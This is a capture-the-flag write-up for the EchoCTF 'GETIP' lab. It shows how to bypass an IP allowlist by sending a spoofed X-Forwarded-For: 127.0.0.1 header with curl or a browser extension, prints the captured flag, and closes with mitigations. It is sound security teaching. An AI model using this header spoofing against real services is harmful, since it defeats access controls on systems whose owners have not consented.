
![getip](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/GETIP/GETIP.png)
# GETIP - CTF Writeup

---

## Introduction

The **GETIP** machine from **EchoCTF** presents a challenge based on manipulating HTTP headers so that the server interprets the request as coming from an allowed IP. The hint indicates that when a web request is forwarded through intermediary servers, a header is added to indicate who the request is being forwarded for. To solve the challenge, we need to make our IP appear as `localhost` or `127.0.0.1`.

---

## Reconnaissance and Exploration

When making an HTTP connection to the address `http://10.0.41.6:1337/` we receive the response:

```csharp
10.10.6.42 is not allowed...
```

This response indicates that the real IP from which the request is made (`10.10.6.42`) is blocked.

---

## Header Manipulation for Bypass

We observe that our `IP 10.10.6.42` is not allowed. The previous hint and this response indicate that we must change our `IP to 127.0.0.1 or 'localhost'` by manipulating headers, which can be achieved in two ways: graphically and via terminal. Both methods are explained below.

### Terminal Method (using curl)

Making a simple request with curl:

```bash
curl http://10.0.41.6:1337/
```

We get:

```
10.10.6.42 is not allowed...
```

If we want to see the headers our request sends, we can use:

```bash
curl -v http://10.0.41.6:1337/
```

This shows information like:

```
> GET / HTTP/1.1
> Host: 10.0.41.6:1337
> User-Agent: curl/8.13.0
> Accept: */*
```

To modify the apparent IP, we add the header `X-Forwarded-For` with the desired IP:

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://10.0.41.6:1337/
```

With this, the request appears to come from `127.0.0.1` instead of `10.10.6.42`.

Successful response:

```
ETSCTF_SheesStealer_was_here%
```

---

### Graphical Method (using browser and extensions)

1. We enter the URL `http://10.0.41.6:1337/` in the browser and see the blocking message.
![getip2](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/GETIP/getip2.png)

2. We open the **ModHeader** extension (available for Chrome and Firefox).

![getip3](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/GETIP/getip3.png)

3. We add a new header with:
   - Name: `X-Forwarded-For`
   - Value: `127.0.0.1`

![getip4](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/GETIP/getip4.png)

4. We reload the page or navigate again to the URL.  
5. The response now shows the flag correctly.

---

## Vulnerability Identification

- The server trusts the value of the `X-Forwarded-For` header without proper validation.
- There is no robust authentication or IP validation control.
- Validation is based solely on the IP sent in manipulable headers, allowing spoofing.
- This misplaced trust opens the door to bypassing access controls and filtering.

---

## Mitigation Measures

- Validate and sanitize `X-Forwarded-For` and similar headers to ensure they come from trusted sources.
- Do not rely exclusively on HTTP headers to determine the real client IP.
- Implement access controls based on strong authentication rather than relying on IPs.
- Configure proxies and front-end servers to prevent users from modifying critical headers.
- Log and monitor suspicious accesses and anomalous patterns.

---

```c
Writeup Made With ❤️ By SheepsStealer
```
